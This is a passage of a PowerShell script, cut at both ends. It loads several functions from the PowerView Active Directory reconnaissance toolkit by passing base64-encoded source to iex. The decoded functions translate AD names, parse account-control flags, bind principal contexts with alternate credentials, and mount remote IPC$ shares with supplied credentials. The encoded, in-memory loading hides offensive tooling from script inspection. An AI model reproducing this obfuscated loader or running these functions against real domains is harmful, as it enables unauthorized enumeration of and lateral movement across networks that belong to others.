CROYW1lVHlwZXMgPSBAewogICAgICAgICAgICAnRE4nICAgICAgICAgICAgICAgID0gICAxICAjIENOPVBoaW5lYXMgRmx5bm4sT1U9RW5naW5lZXJzLERDPWZhYnJpa2FtLERDPWNvbQogICAgICAgICAgICAnQ2Fub25pY2FsJyAgICAgICAgID0gICAyICAjIGZhYnJpa2FtLmNvbS9FbmdpbmVlcnMvUGhpbmVhcyBGbHlubgogICAgICAgICAgICAnTlQ0JyAgICAgICAgICAgICAgID0gICAzICAjIGZhYnJpa2FtXHBmbHlubgogICAgICAgICAgICAnRGlzcGxheScgICAgICAgICAgID0gICA0ICAjIHBmbHlubgogICAgICAgICAgICAnRG9tYWluU2ltcGxlJyAgICAgID0gICA1ICAjIHBmbHlubkBmYWJyaWthbS5jb20KICAgICAgICAgICAgJ0VudGVycHJpc2VTaW1wbGUnICA9ICAgNiAgIyBwZmx5bm5AZmFicmlrYW0uY29tCiAgICAgICAgICAgICdHVUlEJyAgICAgICAgICAgICAgPSAgIDcgICMgezk1ZWU5ZmZmLTM0MzYtMTFkMS1iMmIwLWQxNWFlM2FjODQzNn0KICAgICAgICAgICAgJ1Vua25vd24nICAgICAgICAgICA9ICAgOCAgIyB1bmtub3duIHR5cGUgLSBsZXQgdGhlIHNlcnZlciBkbyB0cmFuc2xhdGlvbgogICAgICAgICAgICAnVVBOJyAgICAgICAgICAgICAgID0gICA5ICAjIHBmbHlubkBmYWJyaWthbS5jb20KICAgICAgICAgICAgJ0Nhbm9uaWNhbEV4JyAgICAgICA9ICAgMTAgIyBmYWJyaWthbS5jb20vVXNlcnMvUGhpbmVhcyBGbHlubgogICAgICAgICAgICAnU1BOJyAgICAgICAgICAgICAgID0gICAxMSAjIEhUVFAva2Fpcm9tYWMuY29udG9zby5jb20KICAgICAgICAgICAgJ1NJRCcgICAgICAgICAgICAgICA9ICAgMTIgIyBTLTEtNS0yMS0xMjk4NjIzMS02MDA2NDE1NDctNzA5MTIyMjg4LTU3OTk5CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEludm9rZS1NZXRob2QoW19fQ29tT2JqZWN0XSAkT2JqZWN0LCBbU3RyaW5nXSAkTWV0aG9kLCAkUGFyYW1ldGVycykgewogICAgICAgICAgICAkT3V0cHV0ID0gJE51bGwKICAgICAgICAgICAgJE91dHB1dCA9ICRPYmplY3QuR2V0VHlwZSgpLkludm9rZU1lbWJlcigkTWV0aG9kLCAnSW52b2tlTWV0aG9kJywgJE5VTEwsICRPYmplY3QsICRQYXJhbWV0ZXJzKQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJE91dHB1dAogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBHZXQtUHJvcGVydHkoW19fQ29tT2JqZWN0XSAkT2JqZWN0LCBbU3RyaW5nXSAkUHJvcGVydHkpIHsKICAgICAgICAgICAgJE9iamVjdC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCRQcm9wZXJ0eSwgJ0dldFByb3BlcnR5JywgJE5VTEwsICRPYmplY3QsICROVUxMKQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBTZXQtUHJvcGVydHkoW19fQ29tT2JqZWN0XSAkT2JqZWN0LCBbU3RyaW5nXSAkUHJvcGVydHksICRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgIFtWb2lkXSAkT2JqZWN0LkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJFByb3BlcnR5LCAnU2V0UHJvcGVydHknLCAkTlVMTCwgJE9iamVjdCwgJFBhcmFtZXRlcnMpCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7CiAgICAgICAgICAgICRBRFNJbml0VHlwZSA9IDIKICAgICAgICAgICAgJEluaXROYW1lID0gJFNlcnZlcgogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJEFEU0luaXRUeXBlID0gMQogICAgICAgICAgICAkSW5pdE5hbWUgPSAkRG9tYWluCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJENyZWQgPSAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpCiAgICAgICAgICAgICRBRFNJbml0VHlwZSA9IDEKICAgICAgICAgICAgJEluaXROYW1lID0gJENyZWQuRG9tYWluCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkQURTSW5pdFR5cGUgPSAzCiAgICAgICAgICAgICRJbml0TmFtZSA9ICROdWxsCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJFRhcmdldElkZW50aXR5IGluICRJZGVudGl0eSkgewogICAgICAgICAgICBpZiAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ091dHB1dFR5cGUnXSkgewogICAgICAgICAgICAgICAgaWYgKCRUYXJnZXRJZGVudGl0eSAtbWF0Y2ggIl5bQS1aYS16XStcXFtBLVphLXogXSsiKSB7CiAgICAgICAgICAgICAgICAgICAgJEFEU091dHB1dFR5cGUgPSAkTmFtZVR5cGVzWydEb21haW5TaW1wbGUnXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJEFEU091dHB1dFR5cGUgPSAkTmFtZVR5cGVzWydOVDQnXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEFEU091dHB1dFR5cGUgPSAkTmFtZVR5cGVzWyRPdXRwdXRUeXBlXQogICAgICAgICAgICB9CiAgICAgICAgICAgICRUcmFuc2xhdGUgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgTmFtZVRyYW5zbGF0ZQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJENyZWQgPSAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpCiAgICAgICAgICAgICAgICAgICAgSW52b2tlLU1ldGhvZCAkVHJhbnNsYXRlICdJbml0RXgnICgKICAgICAgICAgICAgICAgICAgICAgICAgJEFEU0luaXRUeXBlLAogICAgICAgICAgICAgICAgICAgICAgICAkSW5pdE5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICRDcmVkLlVzZXJOYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAkQ3JlZC5Eb21haW4sCiAgICAgICAgICAgICAgICAgICAgICAgICRDcmVkLlBhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0LUFETmFtZV0gRXJyb3IgaW5pdGlhbGl6aW5nIHRyYW5zbGF0aW9uIGZvciAnJElkZW50aXR5JyB1c2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgJ0luaXQnICgKICAgICAgICAgICAgICAgICAgICAgICAgJEFEU0luaXRUeXBlLAogICAgICAgICAgICAgICAgICAgICAgICAkSW5pdE5hbWUKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0NvbnZlcnQtQUROYW1lXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICckSWRlbnRpdHknIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgU2V0LVByb3BlcnR5ICRUcmFuc2xhdGUgJ0NoYXNlUmVmZXJyYWwnICgweDYwKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgJ1NldCcgKDgsICRUYXJnZXRJZGVudGl0eSkKICAgICAgICAgICAgICAgIEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAnR2V0JyAoJEFEU091dHB1dFR5cGUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uTWV0aG9kSW52b2NhdGlvbkV4Y2VwdGlvbl0gewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0NvbnZlcnQtQUROYW1lXSBFcnJvciB0cmFuc2xhdGluZyAnJFRhcmdldElkZW50aXR5JyA6ICQoJF8uRXhjZXB0aW9uLklubmVyRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydEZyb20tVUFDVmFsdWUgewogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdVQUMnLCAndXNlcmFjY291bnRjb250cm9sJyldCiAgICAgICAgW0ludF0KICAgICAgICAkVmFsdWUsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2hvd0FsbAogICAgKQogICAgQkVHSU4gewogICAgICAgICRVQUNWYWx1ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJTQ1JJUFQiLCAxKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJBQ0NPVU5URElTQUJMRSIsIDIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkhPTUVESVJfUkVRVUlSRUQiLCA4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJMT0NLT1VUIiwgMTYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlBBU1NXRF9OT1RSRVFEIiwgMzIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlBBU1NXRF9DQU5UX0NIQU5HRSIsIDY0KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJFTkNSWVBURURfVEVYVF9QV0RfQUxMT1dFRCIsIDEyOCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiVEVNUF9EVVBMSUNBVEVfQUNDT1VOVCIsIDI1NikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiTk9STUFMX0FDQ09VTlQiLCA1MTIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIklOVEVSRE9NQUlOX1RSVVNUX0FDQ09VTlQiLCAyMDQ4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJXT1JLU1RBVElPTl9UUlVTVF9BQ0NPVU5UIiwgNDA5NikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiU0VSVkVSX1RSVVNUX0FDQ09VTlQiLCA4MTkyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJET05UX0VYUElSRV9QQVNTV09SRCIsIDY1NTM2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJNTlNfTE9HT05fQUNDT1VOVCIsIDEzMTA3MikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiU01BUlRDQVJEX1JFUVVJUkVEIiwgMjYyMTQ0KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJUUlVTVEVEX0ZPUl9ERUxFR0FUSU9OIiwgNTI0Mjg4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJOT1RfREVMRUdBVEVEIiwgMTA0ODU3NikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiVVNFX0RFU19LRVlfT05MWSIsIDIwOTcxNTIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkRPTlRfUkVRX1BSRUFVVEgiLCA0MTk0MzA0KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJQQVNTV09SRF9FWFBJUkVEIiwgODM4ODYwOCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiVFJVU1RFRF9UT19BVVRIX0ZPUl9ERUxFR0FUSU9OIiwgMTY3NzcyMTYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlBBUlRJQUxfU0VDUkVUU19BQ0NPVU5UIiwgNjcxMDg4NjQpCiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICAkUmVzdWx0VUFDVmFsdWVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICBpZiAoJFNob3dBbGwpIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFVBQ1ZhbHVlIGluICRVQUNWYWx1ZXMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICBpZiAoICgkVmFsdWUgLWJhbmQgJFVBQ1ZhbHVlLlZhbHVlKSAtZXEgJFVBQ1ZhbHVlLlZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFVBQ1ZhbHVlcy5BZGQoJFVBQ1ZhbHVlLk5hbWUsICIkKCRVQUNWYWx1ZS5WYWx1ZSkrIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRVQUNWYWx1ZXMuQWRkKCRVQUNWYWx1ZS5OYW1lLCAiJCgkVUFDVmFsdWUuVmFsdWUpIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFVBQ1ZhbHVlIGluICRVQUNWYWx1ZXMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICBpZiAoICgkVmFsdWUgLWJhbmQgJFVBQ1ZhbHVlLlZhbHVlKSAtZXEgJFVBQ1ZhbHVlLlZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFVBQ1ZhbHVlcy5BZGQoJFVBQ1ZhbHVlLk5hbWUsICIkKCRVQUNWYWx1ZS5WYWx1ZSkiKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRSZXN1bHRVQUNWYWx1ZXMKICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVByaW5jaXBhbENvbnRleHQgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnR3JvdXBOYW1lJywgJ0dyb3VwSWRlbnRpdHknKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50CiAgICB0cnkgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddIC1vciAoJElkZW50aXR5IC1tYXRjaCAnLitcXC4rJykpIHsKICAgICAgICAgICAgaWYgKCRJZGVudGl0eSAtbWF0Y2ggJy4rXFwuKycpIHsKICAgICAgICAgICAgICAgICRDb252ZXJ0ZWRJZGVudGl0eSA9ICRJZGVudGl0eSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eSkgewogICAgICAgICAgICAgICAgICAgICRDb25uZWN0VGFyZ2V0ID0gJENvbnZlcnRlZElkZW50aXR5LlN1YlN0cmluZygwLCAkQ29udmVydGVkSWRlbnRpdHkuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RJZGVudGl0eSA9ICRJZGVudGl0eS5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJENvbm5lY3RUYXJnZXQnIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJE9iamVjdElkZW50aXR5ID0gJElkZW50aXR5CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVByaW5jaXBhbENvbnRleHRdIEJpbmRpbmcgdG8gZG9tYWluICckRG9tYWluJyIKICAgICAgICAgICAgICAgICRDb25uZWN0VGFyZ2V0ID0gJERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1QcmluY2lwYWxDb250ZXh0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMnCiAgICAgICAgICAgICAgICAkQ29udGV4dCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0IC1Bcmd1bWVudExpc3QgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpEb21haW4sICRDb25uZWN0VGFyZ2V0LCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRDb250ZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgLUFyZ3VtZW50TGlzdCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Db250ZXh0VHlwZV06OkRvbWFpbiwgJENvbm5lY3RUYXJnZXQpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1QcmluY2lwYWxDb250ZXh0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMnCiAgICAgICAgICAgICAgICAkRG9tYWluTmFtZSA9IEdldC1Eb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBOYW1lCiAgICAgICAgICAgICAgICAkQ29udGV4dCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0IC1Bcmd1bWVudExpc3QgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpEb21haW4sICREb21haW5OYW1lLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRDb250ZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgLUFyZ3VtZW50TGlzdCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Db250ZXh0VHlwZV06OkRvbWFpbikKICAgICAgICAgICAgfQogICAgICAgICAgICAkT2JqZWN0SWRlbnRpdHkgPSAkSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbnRleHQnICRDb250ZXh0CiAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eScgJE9iamVjdElkZW50aXR5CiAgICAgICAgJE91dAogICAgfQogICAgY2F0Y2ggewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtUHJpbmNpcGFsQ29udGV4dF0gRXJyb3IgY3JlYXRpbmcgYmluZGluZyBmb3Igb2JqZWN0ICgnJElkZW50aXR5JykgY29udGV4dCA6ICRfIgogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLVJlbW90ZUNvbm5lY3Rpb24gewogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJywgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1BhdGgnLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignXFxcXC4qXFwuKicpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbAogICAgKQogICAgQkVHSU4gewogICAgICAgICROZXRSZXNvdXJjZUluc3RhbmNlID0gW0FjdGl2YXRvcl06OkNyZWF0ZUluc3RhbmNlKCRORVRSRVNPVVJDRVcpCiAgICAgICAgJE5ldFJlc291cmNlSW5zdGFuY2UuZHdUeXBlID0gMQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJFBhdGhzID0gQCgpCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJOYW1lJ10pIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyTmFtZSBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJOYW1lID0gJFRhcmdldENvbXB1dGVyTmFtZS5UcmltKCdcJykKICAgICAgICAgICAgICAgICRQYXRocyArPSAsIlxcJFRhcmdldENvbXB1dGVyTmFtZVxJUEMkIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkUGF0aHMgKz0gLCRQYXRoCiAgICAgICAgfQogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRocykgewogICAgICAgICAgICAkTmV0UmVzb3VyY2VJbnN0YW5jZS5scFJlbW90ZU5hbWUgPSAkVGFyZ2V0UGF0aAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLVJlbW90ZUNvbm5lY3Rpb25dIEF0dGVtcHRpbmcgdG8gbW91bnQ6ICRUYXJnZXRQYXRoIgogICAgICAgICAgICAkUmVzdWx0ID0gJE1wcjo6V05ldEFkZENvbm5lY3Rpb24yVygkTmV0UmVzb3VyY2VJbnN0YW5jZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCwgJENyZWRlbnRpYWwuVXNlck5hbWUsIDQpCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICIkVGFyZ2V0UGF0aCBzdWNjZXNzZnVsbHkgbW91bnRlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFRocm93ICJbQWRkLVJlbW90ZUNvbm5lY3Rpb25dIGVycm9yIG1vdW50aW5nICRUYXJnZXRQYXRoIDogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24gewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlck5hbWUnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlck5hbWUnLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAnUGF0aCcsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdcXFxcLipcXC4qJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQYXRoCiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICAkUGF0aHMgPSBAKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXJOYW1lIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlck5hbWUgPSAkVGFyZ2V0Q29tcHV0ZXJOYW1lLlRyaW0oJ1wnKQogICAgICAgICAgICAgICAgJFBhdGhzICs9ICwiXFwkVGFyZ2V0Q29tc